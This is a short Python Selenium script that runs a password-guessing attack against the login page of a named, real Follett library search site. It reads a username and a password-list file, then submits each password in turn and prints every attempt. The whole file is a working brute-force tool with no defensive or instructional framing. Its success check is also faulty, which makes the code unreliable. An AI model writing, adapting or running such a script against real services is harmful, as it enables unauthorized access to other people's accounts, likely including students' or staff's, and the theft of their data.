from typing import Any, Union, List

from selenium import webdriver
import selenium
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.remote.webelement import WebElement

#vars
chromedriver = "C:\webdriver\chromedriver"
driver = webdriver.Chrome()
driver.get("https://search.follettsoftware.com/metasearch/ui/3027")
user = input("Enter username:")
passwfile = input("Enter password file name (with extension ex: .txt):")
elem1: WebElement = driver.find_element_by_css_selector('#headerSideBar > mat-sidenav-content > header > fss-ms-header-std > mat-toolbar > div.rSide > div.rBlock > div > button')
elem1.click()
with open(passwfile) as f:
    passwfile = list(f)


#the actual shit
for line in passwfile:

    driver.implicitly_wait(3)
    sel_user = driver.find_element_by_css_selector('#userName')
    sel_user.send_keys(user)
    sel_pass = driver.find_element_by_css_selector('#userPassword')
    sel_pass.send_keys(line)
    login_btn=driver.find_element_by_css_selector("#loginForm > div > div > button.button.primary.material-ripple")
    login_btn.click()
    print("------------------------------")
    print("tried pass:" +line + 'for:' + user)
    print('------------------------------')
    try_agian= driver.find_element_by_css_selector("#body > div > div > div > div > div > div.col2 > div.go_back_btn > input")
    try_agian.click()
    temp=line

if selenium.common.exceptions.NoSuchElementException:
    assert isinstance(temp, object)
    print(temp)

